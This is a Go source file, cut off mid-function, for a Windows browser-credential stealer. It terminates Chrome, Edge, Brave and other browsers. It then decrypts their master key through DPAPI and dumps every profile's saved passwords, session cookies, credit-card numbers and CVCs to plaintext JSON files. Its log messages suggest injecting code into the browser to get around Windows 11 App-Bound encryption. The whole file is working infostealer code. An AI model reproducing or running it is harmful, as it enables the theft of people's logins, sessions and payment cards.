
package decrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
	"unicode/utf8"

	_ "github.com/mattn/go-sqlite3"
)


type ProtectionLevel int

const (
	ProtectionLevelNone ProtectionLevel = iota
	ProtectionLevelPathValidationOld
	ProtectionLevelPathValidation
	ProtectionLevelMax
)


const (
	KeySize       = 32
	GcmIVLength   = 12
	GcmTagLength  = 16
	V20Prefix     = "v20"
)

var KeyPrefix = []byte{'A', 'P', 'P', 'B'}

var (
	crypt32                = syscall.NewLazyDLL("crypt32.dll")
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
	procLocalFree          = kernel32.NewProc("LocalFree")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func dpapiDecrypt(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("input data is empty")
	}
	
	var outBlob dataBlob
	
	inBlob := dataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}
	
	ret, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),  // pDataIn
		0,                                 // ppszDataDescr
		0,                                 // pOptionalEntropy
		0,                                 // pvReserved
		0,                                 // pPromptStruct
		0,                                 // dwFlags
		uintptr(unsafe.Pointer(&outBlob)), // pDataOut
	)
	
	if ret == 0 {
		// Standard DPAPI failed, try with CRYPTPROTECT_UI_FORBIDDEN flag for Windows 11
		ret, _, err = procCryptUnprotectData.Call(
			uintptr(unsafe.Pointer(&inBlob)),  // pDataIn
			0,                                 // ppszDataDescr
			0,                                 // pOptionalEntropy
			0,                                 // pvReserved
			0,                                 // pPromptStruct
			0x1,                               // dwFlags: CRYPTPROTECT_UI_FORBIDDEN
			uintptr(unsafe.Pointer(&outBlob)), // pDataOut
		)
		
		if ret == 0 {
			// Try with CRYPTPROTECT_LOCAL_MACHINE flag
			ret, _, err = procCryptUnprotectData.Call(
				uintptr(unsafe.Pointer(&inBlob)),  // pDataIn
				0,                                 // ppszDataDescr
				0,                                 // pOptionalEntropy
				0,                                 // pvReserved
				0,                                 // pPromptStruct
				0x4,                               // dwFlags: CRYPTPROTECT_LOCAL_MACHINE
				uintptr(unsafe.Pointer(&outBlob)), // pDataOut
			)
			
			if ret == 0 {
				return nil, fmt.Errorf("DPAPI decryption failed: %v (Windows 11 App-Bound encryption may require browser process context)", err)
			}
		}
	}
	
	if outBlob.cbData == 0 || outBlob.pbData == nil {
		return nil, fmt.Errorf("DPAPI returned empty result")
	}
	
	// Convert output to Go slice
	output := make([]byte, outBlob.cbData)
	copy(output, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData:outBlob.cbData])
	
	// Free the memory allocated by Windows
	procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	
	return output, nil
}

func isWindows11() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	
	cmd := exec.Command("wmic", "os", "get", "Version", "/value")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "Version=") {
			version := strings.TrimPrefix(line, "Version=")
			version = strings.TrimSpace(version)
			
			// Parse version parts
			parts := strings.Split(version, ".")
			if len(parts) >= 3 {
				major, _ := strconv.Atoi(parts[0])
				minor, _ := strconv.Atoi(parts[1])
				build, _ := strconv.Atoi(parts[2])
				
				// Windows 11 detection: version 10.0.22000+
				if major == 10 && minor == 0 && build >= 22000 {
					return true
				}
			}
		}
	}
	
	return false
}

// handleAppBoundEncryption provides specific handling for Windows 11 App-Bound encryption
func handleAppBoundEncryption(data []byte) ([]byte, error) {
	log.Printf("[INFO] Detected App-Bound encryption (Windows 11). This may require running from browser process context.")
	
	// Try alternative approaches for Windows 11
	if isWindows11() {
		log.Printf("[INFO] Windows 11 detected. App-Bound encryption requires elevated privileges or browser process context.")
		log.Printf("[WORKAROUND] Consider running this tool while browser is closed or with elevated privileges.")
		log.Printf("[WORKAROUND] Alternatively, run from within browser context using extension or injected code.")
		
		// Try to save the encrypted data for manual analysis
		return nil, fmt.Errorf("Windows 11 App-Bound encryption detected - decryption requires browser process context")
	}
	
	return dpapiDecrypt(data)
}

type BrowserConfig struct {
	Name            string
	ProcessName     string
	UserDataSubPath string
}

func GetBrowserConfigs() map[string]BrowserConfig {
	return map[string]BrowserConfig{
		"chrome": {
			Name:            "Chrome",
			ProcessName:     "chrome.exe",
			UserDataSubPath: filepath.Join("Google", "Chrome", "User Data"),
		},
		"brave": {
			Name:            "Brave",
			ProcessName:     "brave.exe",
			UserDataSubPath: filepath.Join("BraveSoftware", "Brave-Browser", "User Data"),
		},
		"edge": {
			Name:            "Edge",
			ProcessName:     "msedge.exe",
			UserDataSubPath: filepath.Join("Microsoft", "Edge", "User Data"),
		},
	}
}

type ExtractionConfig struct {
	DBRelativePath string
	OutputFileName string
	SQLQuery       string
	PreQuerySetup  func(*sql.DB) (interface{}, error)
	JSONFormatter  func(*sql.Rows, []byte, interface{}) (string, error)
}

func getLocalAppDataPath() (string, error) {
	return os.Getenv("LOCALAPPDATA"), nil
}

func base64Decode(input string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(input)
}

func bytesToHexString(bytes []byte) string {
	return hex.EncodeToString(bytes)
}

func escapeJSON(s string) string {
	escaped, _ := json.Marshal(s)
	// Remove surrounding quotes
	return string(escaped[1 : len(escaped)-1])
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// isValidUTF8 checks if the given byte slice contains valid UTF-8 text
func isValidUTF8(data []byte) bool {
	return utf8.Valid(data)
}

func decryptGCM(key []byte, blob []byte) ([]byte, error) {
	if len(blob) == 0 {
		return nil, fmt.Errorf("blob is empty")
	}

	if strings.HasPrefix(string(blob), V20Prefix) {
		return decryptV20GCM(key, blob)
	}
	
	if strings.HasPrefix(string(blob), "v10") {
		return decryptV10GCM(key, blob)
	}
	
	if len(blob) >= 4 {
		decrypted, err := dpapiDecrypt(blob)
		if err == nil {
			return decrypted, nil
		}
	}
	
	if len(blob) >= GcmIVLength+GcmTagLength {
		return decryptRawGCM(key, blob)
	}

	return nil, fmt.Errorf("unknown encryption format, blob length: %d, first 16 bytes: %x", len(blob), blob[:min(16, len(blob))])
}

func decryptV20GCM(key []byte, blob []byte) ([]byte, error) {
	gcmOverheadLength := len(V20Prefix) + GcmIVLength + GcmTagLength

	if len(blob) < gcmOverheadLength {
		return nil, fmt.Errorf("v20 blob is too small")
	}

	prefixLen := len(V20Prefix)
	iv := blob[prefixLen : prefixLen+GcmIVLength]
	ciphertext := blob[prefixLen+GcmIVLength : len(blob)-GcmTagLength]
	tag := blob[len(blob)-GcmTagLength:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}
	ciphertextWithTag := append(ciphertext, tag...)
	plaintext, err := gcm.Open(nil, iv, ciphertextWithTag, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt v20: %v", err)
	}

	return plaintext, nil
}

func decryptV10GCM(key []byte, blob []byte) ([]byte, error) {
	v10PrefixLen := 3
	gcmOverheadLength := v10PrefixLen + GcmIVLength + GcmTagLength

	if len(blob) < gcmOverheadLength {
		return nil, fmt.Errorf("v10 blob is too small")
	}

	iv := blob[v10PrefixLen : v10PrefixLen+GcmIVLength]
	ciphertext := blob[v10PrefixLen+GcmIVLength : len(blob)-GcmTagLength]
	tag := blob[len(blob)-GcmTagLength:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}
	ciphertextWithTag := append(ciphertext, tag...)
	plaintext, err := gcm.Open(nil, iv, ciphertextWithTag, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt v10: %v", err)
	}

	return plaintext, nil
}

func decryptRawGCM(key []byte, blob []byte) ([]byte, error) {
	if len(blob) < GcmIVLength+GcmTagLength {
		return nil, fmt.Errorf("raw blob is too small")
	}
	iv := blob[:GcmIVLength]
	ciphertext := blob[GcmIVLength : len(blob)-GcmTagLength]
	tag := blob[len(blob)-GcmTagLength:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}
	ciphertextWithTag := append(ciphertext, tag...)
	plaintext, err := gcm.Open(nil, iv, ciphertextWithTag, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt raw: %v", err)
	}

	return plaintext, nil
}

func getEncryptedMasterKey(localStatePath string) ([]byte, error) {
	content, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("could not read Local State file: %v", err)
	}

	contentStr := string(content)
	
	log.Printf("[DEBUG] Searching for encryption keys in Local State file...")
	lines := strings.Split(contentStr, ",")
	for _, line := range lines {
		lower := strings.ToLower(line)
		if strings.Contains(lower, "key") || strings.Contains(lower, "encrypt") || strings.Contains(lower, "bound") {
			cleaned := strings.TrimSpace(line)
			if len(cleaned) > 100 {
				cleaned = cleaned[:100] + "..."
			}
			log.Printf("[DEBUG] Found potential key field: %s", cleaned)
		}
	}
	
	possibleKeys := []string{
		`"os_crypt":{"app_bound_encrypted_key":"`,
		`"app_bound_encrypted_key":"`,
		`"os_crypt":{"encrypted_key":"`,
		`"encrypted_key":"`,
	}
	
	var encodedKey string
	var foundKeyType string
	
	for _, tag := range possibleKeys {
		startPos := strings.Index(contentStr, tag)
		if startPos != -1 {
			startPos += len(tag)
			endPos := strings.Index(contentStr[startPos:], `"`)
			if endPos != -1 {
				endPos += startPos
				encodedKey = contentStr[startPos:endPos]
				foundKeyType = tag
				break
			}
		}
	}
	
	if encodedKey == "" {
		return nil, fmt.Errorf("no encryption key found in Local State file")
	}
	
	log.Printf("[DEBUG] Found encryption key using pattern: %s", foundKeyType)
	log.Printf("[DEBUG] Encoded key length: %d", len(encodedKey))

	decodedData, err := base64Decode(encodedKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode base64: %v", err)
	}

	log.Printf("[DEBUG] Decoded data length: %d", len(decodedData))
	log.Printf("[DEBUG] First 16 bytes: %x", decodedData[:min(16, len(decodedData))])

	if len(decodedData) < 4 {
		return nil, fmt.Errorf("decoded data too short")
	}

	dpapiPrefix := []byte{'D', 'P', 'A', 'P', 'I'}
	appbPrefix := []byte{'A', 'P', 'P', 'B'}
	
	if len(decodedData) >= len(dpapiPrefix) {
		hasDpapiPrefix := true
		for i, b := range dpapiPrefix {
			if decodedData[i] != b {
				hasDpapiPrefix = false
				break
			}
		}
		if hasDpapiPrefix {
			log.Printf("[DEBUG] Found DPAPI prefix, removing it")
			return decodedData[len(dpapiPrefix):], nil
		}
	}
	
	// Check for APPB prefix (newer App-Bound encryption)
	if len(decodedData) >= len(appbPrefix) {
		hasAppbPrefix := true
		for i, b := range appbPrefix {
			if decodedData[i] != b {
				hasAppbPrefix = false
				break
			}
		}
		if hasAppbPrefix {
			log.Printf("[DEBUG] Found APPB prefix, removing it")
			return decodedData[len(appbPrefix):], nil
		}
	}
	
	log.Printf("[DEBUG] No known prefix found, using raw data")
	return decodedData, nil
}

// Browser functions
func killProcesses(processName string) error {
	log.Printf("[*] Attempting to kill %s processes...", processName)
	
	// Use taskkill to forcefully terminate the browser processes
	cmd := exec.Command("taskkill", "/f", "/im", processName)
	output, err := cmd.CombinedOutput()
	
	if err != nil {
		// Check if the error is because no process was found
		if strings.Contains(string(output), "not found") || strings.Contains(string(output), "not running") {
			log.Printf("[*] No %s processes found running", processName)
			return nil
		}
		log.Printf("[-] Failed to kill %s: %v, output: %s", processName, err, string(output))
		return err
	}
	
	log.Printf("[+] Successfully killed %s processes: %s", processName, strings.TrimSpace(string(output)))
	return nil
}

func killAllBrowserProcesses() error {
	log.Printf("[*] Killing all browser processes...")
	
	// Kill all common browser processes
	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "firefox.exe", "opera.exe"}
	
	for _, browser := range browsers {
		killProcesses(browser) // Ignore errors since browsers might not be running
	}
	
	// Give processes time to fully terminate
	time.Sleep(3 * time.Second)
	log.Printf("[+] Browser process termination complete")
	
	return nil
}

// Data extraction configurations
func getExtractionConfigs() []ExtractionConfig {
	return []ExtractionConfig{
		{
			DBRelativePath: filepath.Join("Network", "Cookies"),
			OutputFileName: "cookies",
			SQLQuery:       "SELECT host_key, name, encrypted_value FROM cookies;",
			PreQuerySetup:  nil,
			JSONFormatter: func(rows *sql.Rows, key []byte, state interface{}) (string, error) {
				var hostKey, name string
				var encryptedValue []byte

				err := rows.Scan(&hostKey, &name, &encryptedValue)
				if err != nil {
					return "", err
				}

				var decryptedValue string
				var isBase64Encoded bool
				var status string
				
				if len(encryptedValue) > 0 {
					// Debug: Show encrypted value details with enhanced format detection
					prefix := ""
					if len(encryptedValue) >= 3 {
						prefix = string(encryptedValue[:3])
					}
					
					// Check for different encryption formats
					var formatInfo string
					if strings.HasPrefix(string(encryptedValue), V20Prefix) {
						formatInfo = "V20_GCM"
					} else if strings.HasPrefix(string(encryptedValue), "v10") {
						formatInfo = "V10_GCM"
					} else if len(encryptedValue) >= 4 {
						// Check if it might be DPAPI encrypted
						formatInfo = "POSSIBLE_DPAPI"
					} else {
						formatInfo = "RAW_GCM"
					}
					
					log.Printf("[DEBUG] Cookie %s.%s: length=%d, prefix='%s', format=%s, first 16 bytes=%x", 
						hostKey, name, len(encryptedValue), prefix, formatInfo, encryptedValue[:min(16, len(encryptedValue))])
					
					decrypted, err := decryptGCM(key, encryptedValue)
					if err != nil {
						log.Printf("[DEBUG] Failed to decrypt cookie %s.%s: %v", hostKey, name, err)
						// Instead of showing decrypt error, base64-encode the encrypted data
						decryptedValue = base64.StdEncoding.EncodeToString(encryptedValue)
						isBase64Encoded = true
						status = "ENCRYPTED"
					} else {
						// Check if decrypted data is valid UTF-8
						if isValidUTF8(decrypted) {
							decryptedValue = string(decrypted)
							isBase64Encoded = false
							status = "DECRYPTED"
						} else {
							// Binary data - encode as base64 for safe transport
							decryptedValue = base64.StdEncoding.EncodeToString(decrypted)
							isBase64Encoded = true
							status = "DECRYPTED_BINARY"
						}
						log.Printf("[DEBUG] Successfully decrypted cookie %s.%s: length=%d, isUTF8=%t", hostKey, name, len(decrypted), !isBase64Encoded)
					}
				} else {
					decryptedValue = ""
					isBase64Encoded = false
					status = "EMPTY"
				}

				// Create a more detailed JSON structure
				if isBase64Encoded {
					return fmt.Sprintf(`  {"host_key":"%s","name":"%s","value":"%s","encoding":"base64","status":"%s"}`,
						escapeJSON(hostKey), escapeJSON(name), decryptedValue, status), nil
				} else {
					return fmt.Sprintf(`  {"host_key":"%s","name":"%s","value":"%s","encoding":"utf8","status":"%s"}`,
						escapeJSON(hostKey), escapeJSON(name), escapeJSON(decryptedValue), status), nil
				}
			},
		},
		{
			DBRelativePath: "Login Data",
			OutputFileName: "passwords",
			SQLQuery:       "SELECT origin_url, username_value, password_value FROM logins;",
			PreQuerySetup:  nil,
			JSONFormatter: func(rows *sql.Rows, key []byte, state interface{}) (string, error) {
				var originURL, username string
				var passwordValue []byte

				err := rows.Scan(&originURL, &username, &passwordValue)
				if err != nil {
					return "", err
				}

				var decryptedPassword string
				if len(passwordValue) > 0 {
					// Debug: Show encrypted password details
					prefix := ""
					if len(passwordValue) >= 3 {
						prefix = string(passwordValue[:3])
					}
					log.Printf("[DEBUG] Password %s.%s: length=%d, prefix='%s', first 16 bytes=%x", 
						originURL, username, len(passwordValue), prefix, passwordValue[:min(16, len(passwordValue))])
					
					decrypted, err := decryptGCM(key, passwordValue)
					if err != nil {
						log.Printf("[DEBUG] Failed to decrypt password %s.%s: %v", originURL, username, err)
						decryptedPassword = fmt.Sprintf("[DECRYPT_FAILED: %s]", err.Error())
					} else {
						decryptedPassword = string(decrypted)
						log.Printf("[DEBUG] Successfully decrypted password %s.%s: length=%d", originURL, username, len(decryptedPassword))
					}
				} else {
					decryptedPassword = "[NO_ENCRYPTED_DATA]"
				}

				return fmt.Sprintf(`  {"origin_url":"%s","username":"%s","password":"%s"}`,
					escapeJSON(originURL), escapeJSON(username), escapeJSON(decryptedPassword)), nil
			},
		},
		{
			DBRelativePath: "Web Data",
			OutputFileName: "payments",
			SQLQuery:       "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
			PreQuerySetup: func(db *sql.DB) (interface{}, error) {
				cvcMap := make(map[string][]byte)
				rows, err := db.Query("SELECT guid, value_encrypted FROM local_stored_cvc;")
				if err != nil {
					return cvcMap, nil // Return empty map if table doesn't exist
				}
				defer rows.Close()

				for rows.Next() {
					var guid string
					var valueEncrypted []byte
					if err := rows.Scan(&guid, &valueEncrypted); err == nil {
						cvcMap[guid] = valueEncrypted
					}
				}
				return cvcMap, nil
			},
			JSONFormatter: func(rows *sql.Rows, key []byte, state interface{}) (string, error) {
				var guid, nameOnCard string
				var expirationMonth, expirationYear int
				var cardNumberEncrypted []byte

				err := rows.Scan(&guid, &nameOnCard, &expirationMonth, &expirationYear, &cardNumberEncrypted)
				if err != nil {
					return "", err
				}

				var cardNumber, cvc string
				if len(cardNumberEncrypted) > 0 {
					// Debug: Show encrypted card details
					prefix := ""
					if len(cardNumberEncrypted) >= 3 {
						prefix = string(cardNumberEncrypted[:3])
					}
					log.Printf("[DEBUG] Card %s: length=%d, prefix='%s', first 16 bytes=%x", 
						guid, len(cardNumberEncrypted), prefix, cardNumberEncrypted[:min(16, len(cardNumberEncrypted))])
					
					decrypted, err := decryptGCM(key, cardNumberEncrypted)
					if err != nil {
						log.Printf("[DEBUG] Failed to decrypt card number %s: %v", guid, err)
						cardNumber = fmt.Sprintf("[DECRYPT_FAILED: %s]", err.Error())
					} else {
						cardNumber = string(decrypted)
						log.Printf("[DEBUG] Successfully decrypted card %s: length=%d", guid, len(cardNumber))
					}
				} else {
					cardNumber = "[NO_ENCRYPTED_DATA]"
				}

				if cvcMap, ok := state.(map[string][]byte); ok {
					if cvcEncrypted, exists := cvcMap[guid]; exists && len(cvcEncrypted) > 0 {
						decrypted, err := decryptGCM(key, cvcEncrypted)
						if err != nil {
							log.Printf("[DEBUG] Failed to decrypt CVC %s: %v", guid, err)
							cvc = "[DECRYPTION_FAILED]"
						} else {
							cvc = string(decrypted)
						}
					} else {
						cvc = "[NO_CVC_DATA]"
					}
				}

				return fmt.Sprintf(`  {"name_on_card":"%s","expiration_month":%d,"expiration_year":%d,"card_number":"%s","cvc":"%s"}`,
					escapeJSON(nameOnCard), expirationMonth, expirationYear, escapeJSON(cardNumber), escapeJSON(cvc)), nil
			},
		},
	}
}

// DecryptionSession represents the main decryption session
type DecryptionSession struct {
	config     BrowserConfig
	verbose    bool
	outputPath string
}

// NewDecryptionSession creates a new decryption session
func NewDecryptionSession(verbose bool, outputPath string) (*DecryptionSession, error) {
	// We'll process all browsers, starting with Chrome as default
	configs := GetBrowserConfigs()
	config := configs["chrome"] // Default to Chrome
	
	return &DecryptionSession{
		config:     config,
		verbose:    verbose,
		outputPath: outputPath,
	}, nil
}

// NewDecryptionSessionForBrowser creates a session for a specific browser
func NewDecryptionSessionForBrowser(browserName string, verbose bool, outputPath string) (*DecryptionSession, error) {
	configs := GetBrowserConfigs()
	config, exists := configs[browserName]
	if !exists {
		return nil, fmt.Errorf("unsupported browser: %s", browserName)
	}
	
	return &DecryptionSession{
		config:     config,
		verbose:    verbose,
		outputPath: outputPath,
	}, nil
}

// Log logs a message
func (ds *DecryptionSession) Log(message string) {
	if ds.verbose {
		log.Println(message)
	}
}

// Run executes the decryption process
func (ds *DecryptionSession) Run() error {
	ds.Log(fmt.Sprintf("[*] Decryption process started for %s", ds.config.Name))

	// Kill all browser processes first to unlock databases
	if err := killAllBrowserProcesses(); err != nil {
		ds.Log(fmt.Sprintf("[-] Warning: Failed to kill browser processes: %v", err))
	}

	// Decrypt master key
	aesKey, err := ds.decryptMasterKey()
	if err != nil {
		return fmt.Errorf("failed to decrypt master key: %v", err)
	}

	ds.Log(fmt.Sprintf("[+] Decrypted AES Key: %s", bytesToHexString(aesKey)))

	// Extract all data
	return ds.extractAllData(aesKey)
}

// runWithoutKilling executes the decryption process without killing browser processes
func (ds *DecryptionSession) runWithoutKilling() error {
	ds.Log(fmt.Sprintf("[*] Decryption process started for %s", ds.config.Name))

	// Decrypt master key
	aesKey, err := ds.decryptMasterKey()
	if err != nil {
		return fmt.Errorf("failed to decrypt master key: %v", err)
	}

	ds.Log(fmt.Sprintf("[+] Decrypted AES Key: %s", bytesToHexString(aesKey)))

	// Extract all data
	return ds.extractAllData(aesKey)
}

func (ds *DecryptionSession) decryptMasterKey() ([]byte, error) {
	localAppData, err := getLocalAppDataPath()
	if err != nil {
		return nil, err
	}

	localStatePath := filepath.Join(localAppData, ds.config.UserDataSubPath, "Local State")
	ds.Log(fmt.Sprintf("[+] Reading Local State file: %s", localStatePath))

	encryptedKeyBlob, err := getEncryptedMasterKey(localStatePath)
	if err != nil {
		return nil, err
	}

	ds.Log("[+] Attempting to decrypt master key using DPAPI...")
	
	// Check for Windows 11 App-Bound encryption
	if isWindows11() {
		ds.Log("[WARNING] Windows 11 detected with potential App-Bound encryption")
		ds.Log("[INFO] This may require running from browser process context or elevated privileges")
	}
	
	// Use DPAPI to decrypt the master key
	decryptedKey, err := dpapiDecrypt(encryptedKeyBlob)
	if err != nil {
		// If standard DPAPI fails on Windows 11, try the enhanced handler
		if isWindows11() {
			ds.Log("[WARNING] Standard DPAPI failed on Windows 11, this is expected for App-Bound encryption")
			ds.Log("[WORKAROUND] Try one of the following:")
			ds.Log("  1. Run with administrator privileges")
			ds.Log("  2. Close all browser instances completely and try again")
			ds.Log("  3. Run from within browser context (browser extension)")
			ds.Log("  4. Use alternative tools designed for Windows 11 App-Bound encryption")
			
			return nil, fmt.Errorf("Windows 11 App-Bound encryption detected - requires browser process context or elevated privileges")
		}
		return nil, fmt.Errorf("DPAPI decryption failed: %v", err)
	}

	if len(decryptedKey) != KeySize {
		return nil, fmt.Errorf("decrypted key has wrong size: got %d, expected %d", len(decryptedKey), KeySize)
	}

	ds.Log("[+] Master key successfully decrypted using DPAPI")
	return decryptedKey, nil
}

func (ds *DecryptionSession) extractAllData(aesKey []byte) error {
	localAppData, err := getLocalAppDataPath()
	if err != nil {
		return err
	}

	userDataRoot := filepath.Join(localAppData, ds.config.UserDataSubPath)
	var profilePaths []string

	// Check if root is a profile
	configs := getExtractionConfigs()
	for _, dataCfg := range configs {
		dbPath := filepath.Join(userDataRoot, dataCfg.DBRelativePath)
		if _, err := os.Stat(dbPath); err == nil {
			profilePaths = append(profilePaths, userDataRoot)
			break
		}
	}

	// Find profile directories
	entries, err := os.ReadDir(userDataRoot)
	if err != nil {
		ds.Log(fmt.Sprintf("[-] Error reading user data directory: %v", err))
	} else {
		for _, entry := range entries {
			if entry.IsDir() {
				profilePath := filepath.Join(userDataRoot, entry.Name())
				for _, dataCfg := range configs {
					dbPath := filepath.Join(profilePath, dataCfg.DBRelativePath)
					if _, err := os.Stat(dbPath); err == nil {
						profilePaths = append(profilePaths, profilePath)
						break
					}
				}
			}
		}
	}

	// Process each profile
	for _, profilePath := range profilePaths {
		ds.Log(fmt.Sprintf("[*] Processing profile: %s", filepath.Base(profilePath)))
		for _, dataCfg := range configs {
			if err := ds.extractDataFromProfile(profilePath, dataCfg, aesKey); err != nil {
				ds.Log(fmt.Sprintf("[-] Error extracting %s: %v", dataCfg.OutputFileName, err))
			}
		}
	}

	return nil
}

func (ds *DecryptionSession) extractDataFromProfile(profilePath string, dataCfg ExtractionConfig, aesKey []byte) error {
	dbPath := filepath.Join(profilePath, dataCfg.DBRelativePath)
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		return nil // Skip if database doesn't exist
	}

	ds.Log(fmt.Sprintf("[*] Opening database: %s", dbPath))

	// Open database
	db, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?mode=ro", dbPath))
	if err != nil {
		return fmt.Errorf("failed to open database: %v", err)
	}
	defer db.Close()

	// Debug: Show table structure
	if ds.verbose {
		ds.debugDatabaseStructure(db, dataCfg)
	}

	// Pre-query setup
	var preQueryState interface{}
	if dataCfg.PreQuerySetup != nil {
		preQueryState, err = dataCfg.PreQuerySetup(db)
		if err != nil {
			return fmt.Errorf("pre-query setup failed: %v", err)
		}
	}

	// Execute query
	rows, err := db.Query(dataCfg.SQLQuery)
	if err != nil {
		return fmt.Errorf("query failed: %v", err)
	}
	defer rows.Close()

	// Create output file
	outputDir := filepath.Join(ds.outputPath, ds.config.Name, filepath.Base(profilePath))
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %v", err)
	}

	outputFile := filepath.Join(outputDir, dataCfg.OutputFileName+".txt")
	file, err := os.Create(outputFile)
	if err != nil {
		return fmt.Errorf("failed to create output file: %v", err)
	}
	defer file.Close()

	// Write JSON array
	file.WriteString("[\n")
	first := true
	count := 0

	for rows.Next() {
		jsonEntry, err := dataCfg.JSONFormatter(rows, aesKey, preQueryState)
		if err != nil {
			continue // Skip errors
		}

		if !first {
			file.WriteString(",\n")
		}
		first = false
		file.WriteString(jsonEntry)
		count++
	}

	file.WriteString("\n]\n")

	if count > 0 {
		ds.Log(fmt.Sprintf("     [*] %d %s extracted to %s", count, dataCfg.OutputFileName, outputFile))
	} else {
		ds.Log(fmt.Sprintf("     [*] No %s found in %s", dataCfg.OutputFileName, filepath.Base(profilePath)))
		// Write a message to the file indicating no data was found
		file.Seek(0, 0)
		file.Truncate(0)
		file.WriteString(fmt.Sprintf("{\n  \"status\": \"no_data_found\",\n  \"message\": \"No %s found in this profile\",\n  \"profile\": \"%s\",\n  \"browser\": \"%s\"\n}\n", 
			dataCfg.OutputFileName, filepath.Base(profilePath), ds.config.Name))
	}

	return nil
}

func (ds *DecryptionSession) debugDatabaseStructure(db *sql.DB, dataCfg ExtractionConfig) {
	// Get table name from the query
	query := strings.ToLower(dataCfg.SQLQuery)
	var tableName string
	
	if strings.Contains(query, "from cookies") {
		tableName = "cookies"
	} else if strings.Contains(query, "from logins") {
		tableName = "logins"
	} else if strings.Contains(query, "from credit_cards") {
		tableName = "credit_cards"
	}
	
	if tableName == "" {
		return
	}
	
	ds.Log(fmt.Sprintf("[DEBUG] Analyzing table: %s", tableName))
	
	// Get column information
	rows, err := db.Query(fmt.Sprintf("PRAGMA table_info(%s)", tableName))
	if err != nil {
		ds.Log(fmt.Sprintf("[DEBUG] Failed to get table info: %v", err))
		return
	}
	defer rows.Close()
	
	ds.Log(fmt.Sprintf("[DEBUG] Columns in %s table:", tableName))
	for rows.Next() {
		var cid int
		var name, dataType, defaultValue string
		var notNull int
		var pk int
		
		err := rows.Scan(&cid, &name, &dataType, &notNull, &defaultValue, &pk)
		if err != nil {
			continue
		}
		
		ds.Log(fmt.Sprintf("[DEBUG]   %d: %s (%s)", cid, name, dataType))
	}
	
	// Show sample data (first 3 rows)
	ds.Log(fmt.Sprintf("[DEBUG] Sample data from %s:", tableName))
	sampleRows, err := db.Query(fmt.Sprintf("SELECT * FROM %s LIMIT 3", tableName))
	if err != nil {
		ds.Log(fmt.Sprintf("[DEBUG] Failed to get sample data: %v", err))
		return
	}
	defer sampleRows.Close()
	
	columns, err := sampleRows.Columns()
	if err != nil {
		ds.Log(fmt.Sprintf("[DEBUG] Failed to get columns: %v", err))
		return
	}
	
	rowCount := 0
	for sampleRows.Next() {
		values := make([]interface{}, len(columns))
		valuePtrs := make([]interface{}, len(columns))
		for i := range values {
			valuePtrs[i] = &values[i]
		}
		
		err := sampleRows.Scan(valuePtrs...)
		if err != nil {
			continue
		}
		
		ds.Log(fmt.Sprintf("[DEBUG] Row %d:", rowCount+1))
		for i, col := range columns {
			var val string
			if values[i] != nil {
				if b, ok := values[i].([]byte); ok && len(b) > 0 {
					if len(b) > 20 {
						val = fmt.Sprintf("BLOB[%d bytes]: %x...", len(b), b[:20])
					} else {
						val = fmt.Sprintf("BLOB[%d bytes]: %x", len(b), b)
					}
				} else {
					val = fmt.Sprintf("%v", values[i])
					if len(val) > 50 {
						val = val[:50] + "..."
					}
				}
			} else {
				val = "NULL"
			}
			ds.Log(fmt.Sprintf("[DEBUG]   %s: %s", col, val))
		}
		rowCount++
	}
}

// Main entry point for the decryption process
func RunDecryption(verbose bool, outputPath string) error {
	// Only run on Windows
	if runtime.GOOS != "windows" {
		return fmt.Errorf("this tool only works on Windows")
	}

	// Kill all browser processes once at the beginning
	log.Printf("[*] Preparing to extract browser data...")
	if err := killAllBrowserProcesses(); err != nil {
		log.Printf("[-] Warning: Failed to kill browser processes: %v", err)
	}

	// Process all supported browsers
	browsers := []string{"chrome", "edge", "brave"}
	var lastError error
	successCount := 0
	
	for _, browserName := range browsers {
		session, err := NewDecryptionSessionForBrowser(browserName, verbose, outputPath)
		if err != nil {
			if verbose {
				log.Printf("[-] Failed to create session for %s: %v", browserName, err)
			}
			lastError = err
			continue
		}
		
		// Don't kill processes again in individual runs
		err = session.runWithoutKilling()
		if err != nil {
			if verbose {
				log.Printf("[-] Failed to decrypt %s data: %v", browserName, err)
			}
			lastError = err
		} else {
			successCount++
		}
	}
	
	if successCount == 0 {
